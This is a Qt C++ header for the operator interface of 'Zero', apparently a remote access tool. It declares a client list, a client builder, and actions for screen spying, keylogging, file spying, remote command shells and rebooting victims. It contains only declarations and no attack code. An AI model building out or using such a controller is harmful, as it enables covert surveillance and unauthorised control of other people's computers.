/*
 *  Author: sumkee911@gmail.com
 *  Date: 2016-12-18
 *  Brief: Zero远控服务端操作界面
 *
 */

#ifndef WIDGET_H
#define WIDGET_H

#include <QWidget>
#include <QDesktopWidget>
#include <QPushButton>
#include <QTableWidget>
#include <QMenu>
#include <QMouseEvent>
#include <QDebug>
#include <QCursor>
#include "zeroserver.h"
#include <QLineEdit>
#include <QMessageBox>
#include <QInputDialog>
#include "keyboardspy.h"
#include "screenspy.h"
#include "filespy.h"
#include "cmdspy.h"
#include <QFile>
#include <QFileDialog>

namespace Ui {
class Widget;
}

class Widget : public QWidget
{
    Q_OBJECT

public:
    explicit Widget(QWidget *parent = 0);
    ~Widget();

private:
    Ui::Widget *ui;
    QTableWidget *mClientTable; // 客户列表
    QMenu *mPopupMenu;          // 弹出菜单
    ZeroServer *mZeroServer;    // 服务端
    QLineEdit *mEditPort;       // 端口设置
    QPushButton *mBtStartServer;    // 开启服务器
    QLineEdit *mEditDomain;     // 域名设置

public slots:
    void screenSpyClicked();
    void keyboardClicked();
    void fileSpyClicked();
    void cmdSpyClicked();
    void sendMessageClicked();
    void rebootClicked();
    void quitClicked();

    // 添加客户到列表
    void addClientToTable(int id, QString name, QString ip, int port, QString systemInfo);

    // 从列表中删除客户
    void removeClientFromTable(int id);

    // 当前选中的客户ID
    int currentClientIdFromTable();

    // 开启服务器
    void startServer();

    // 创建客户端
    void createClient();

protected:
    // 事件过滤
    bool eventFilter(QObject *watched, QEvent *event);
};

#endif // WIDGET_H
